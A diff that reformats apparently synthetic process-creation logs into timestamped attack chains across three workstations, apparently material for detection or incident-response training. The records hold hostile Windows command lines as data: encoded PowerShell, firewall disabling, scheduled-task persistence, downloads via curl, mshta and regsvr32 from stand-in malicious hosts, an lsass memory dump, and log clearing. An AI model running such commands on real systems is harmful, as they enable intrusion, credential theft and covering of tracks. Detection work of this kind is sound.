@@ -1,29 +1,18 @@
-ParentImage: winword.exe Image: powershell.exe CommandLine: powershell -enc SQBFAFgA
+Time=2026-02-03T10:00:01 Host=WS-01 User=sid Parent=winword.exe Process=powershell.exe Cmd="powershell -enc SQBFAFgA"
+Time=2026-02-03T10:00:20 Host=WS-01 User=sid Parent=powershell.exe Process=netsh.exe Cmd="netsh advfirewall set allprofiles state off"
+Time=2026-02-03T10:00:45 Host=WS-01 User=sid Parent=powershell.exe Process=schtasks.exe Cmd="schtasks /create /sc onlogon /tn updater /tr C:\Users\Public\updater.exe"
+Time=2026-02-03T10:01:10 Host=WS-01 User=sid Parent=schtasks.exe Process=cmd.exe Cmd="cmd.exe /c whoami && ipconfig /all"
+Time=2026-02-03T10:01:40 Host=WS-01 User=sid Parent=cmd.exe Process=certutil.exe Cmd="certutil -decode payload.txt payload.exe"
+Time=2026-02-03T10:02:05 Host=WS-01 User=sid Parent=certutil.exe Process=curl.exe Cmd="curl http://malicious.site/payload.exe -o payload.exe"
+Time=2026-02-03T10:02:35 Host=WS-01 User=sid Parent=curl.exe Process=procdump.exe Cmd="procdump.exe -ma lsass.exe"
+Time=2026-02-03T10:03:05 Host=WS-01 User=sid Parent=procdump.exe Process=wevtutil.exe Cmd="wevtutil cl security"
 
-ParentImage: explorer.exe Image: cmd.exe CommandLine: cmd.exe /c whoami && ipconfig /all
+Time=2026-02-03T10:05:10 Host=WS-02 User=admin Parent=explorer.exe Process=systeminfo.exe Cmd="systeminfo"
+Time=2026-02-03T10:05:35 Host=WS-02 User=admin Parent=systeminfo.exe Process=ipconfig.exe Cmd="ipconfig /all"
+Time=2026-02-03T10:06:00 Host=WS-02 User=admin Parent=explorer.exe Process=psexec.exe Cmd="psexec \\192.168.1.10 cmd.exe"
+Time=2026-02-03T10:06:25 Host=WS-02 User=admin Parent=psexec.exe Process=cmd.exe Cmd="cmd.exe /c hostname"
 
-ParentImage: powershell.exe Image: schtasks.exe CommandLine: schtasks /create /sc onlogon /tn updater /tr C:\Users\Public\updater.exe
+Time=2026-02-03T10:07:00 Host=WS-03 User=finance Parent=outlook.exe Process=wscript.exe Cmd="wscript invoice.vbs"
+Time=2026-02-03T10:07:25 Host=WS-03 User=finance Parent=wscript.exe Process=mshta.exe Cmd="mshta http://evil.site/payload.hta"
+Time=2026-02-03T10:07:50 Host=WS-03 User=finance Parent=mshta.exe Process=regsvr32.exe Cmd="regsvr32 /s /u /i:http://malicious.site/file.sct scrobj.dll"
 
-ParentImage: services.exe Image: sc.exe CommandLine: sc create updater binPath= "C:\Users\Public\updater.exe"
-
-ParentImage: explorer.exe Image: regsvr32.exe CommandLine: regsvr32 /s /u /i:http://malicious.site/file.sct scrobj.dll
-
-ParentImage: powershell.exe Image: netsh.exe CommandLine: netsh advfirewall set allprofiles state off
-
-ParentImage: cmd.exe Image: wevtutil.exe CommandLine: wevtutil cl security
-
-ParentImage: explorer.exe Image: procdump.exe CommandLine: procdump.exe -ma lsass.exe
-
-ParentImage: cmd.exe Image: systeminfo.exe CommandLine: systeminfo
-
-ParentImage: cmd.exe Image: ipconfig.exe CommandLine: ipconfig /all
-
-ParentImage: explorer.exe Image: psexec.exe CommandLine: psexec \\192.168.1.10 cmd.exe
-
-ParentImage: powershell.exe Image: curl.exe CommandLine: curl http://malicious.site/payload.exe -o payload.exe
-
-ParentImage: outlook.exe Image: wscript.exe CommandLine: wscript invoice.vbs
-
-ParentImage: excel.exe Image: mshta.exe CommandLine: mshta http://evil.site/payload.hta
-
-ParentImage: cmd.exe Image: certutil.exe CommandLine: certutil -decode payload.txt payload.exe
